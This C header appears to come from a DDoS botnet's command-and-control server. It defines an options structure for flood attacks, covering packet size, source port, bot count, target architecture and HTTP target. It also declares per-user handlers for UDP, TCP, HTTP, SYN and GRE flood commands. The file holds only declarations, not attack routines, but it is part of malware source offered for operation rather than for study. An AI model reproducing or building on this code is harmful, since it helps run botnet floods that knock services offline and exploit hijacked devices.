#ifndef ATTACK_COMMANDS_H
#define ATTACK_COMMANDS_H

#include "user_handler.h"
#include <stdint.h>

typedef struct {
    int psize;
    int psize_min;
    int psize_max;
    int srcport;
    int botcount;
    int gport;
    uint8_t http_method;
    char proto[8];
    char sarch[64];
    char msg_bytes[64];
    char http_target[256];
    int msg_len;
    int usleep_min;
    int usleep_max;
    
    int has_psize;
    int has_srcport;
    int has_botcount;
    int has_gport;
    int has_proto;
    int has_sarch;
    int has_msg;
    int has_usleep;
    int has_httpmode;
} AttackOptions;

void init_attack_options(AttackOptions *options);
void handle_udp_command(const User *user, const char *command, char *response);
void handle_udpplain_command(const User *user, const char *command, char *response);
void handle_tcp_command(const User *user, const char *command, char *response);
void handle_http_command(const User *user, const char *command, char *response);
void handle_syn_command(const User *user, const char *command, char *response);
void handle_gre_command(const User *user, const char *command, char *response);

int is_attack_command(const char *command);

#endif // ATTACK_COMMANDS_H
